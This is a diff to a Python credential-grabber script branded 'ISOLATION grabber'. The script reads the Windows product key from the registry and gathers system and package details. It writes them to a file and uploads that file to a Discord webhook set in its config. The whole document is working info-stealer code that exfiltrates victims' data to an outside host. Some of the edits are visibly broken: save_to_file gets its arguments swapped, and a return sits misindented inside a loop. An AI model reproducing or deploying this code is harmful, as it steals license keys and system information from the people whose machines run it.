@@ -49,19 +49,19 @@ respons = urlopen(data_link)
 data = json.load(respons)
 
 def get_windows_product_key():
-    import winreg
-    key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-    value_name = "DigitalProductId"
+    try:
+        import winreg
+        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+        value_name = "DigitalProductId"
 
-    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
-        product_key_bytes = winreg.QueryValueEx(key, value_name)[0]
-    
-    product_key = ""
-    for b in product_key_bytes[52:67]:
-        product_key += "%02x" % b
-    if platform.system() == "Windows":
-        return product_key
-    else:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
+            product_key_bytes = winreg.QueryValueEx(key, value_name)[0]
+        
+        product_key = ""
+        for b in product_key_bytes[52:67]:
+            product_key += "%02x" % b
+            return product_key
+    except:
         return platform.system()
 def get_linux_distro():
     try:
@@ -124,12 +124,12 @@ def get_system_info():
     else:
         platform.system()
 
-def save_to_file(filename="packages.txt",data=get_system_info()):
+def save_to_file(filename,data):
     with open(filename, 'w') as f:
         for item in data:
             f.write(item + '\n')
-            
-save_to_file()
+systm_packages = get_system_info()
+save_to_file(systm_packages, "packages.txt")
 
 def main():
     webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
@@ -138,7 +138,7 @@ def main():
     embed.set_footer(text="Grabbed w/ ISOLATION grabber")
     embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
     webhook.add_embed(embed=embed)
-    webhook.add_file("./packages.txt")
+    webhook.add_file(file="packages.txt",filename="packages.txt")
     webhook.execute()
 if __name__== "__main__":
     main()
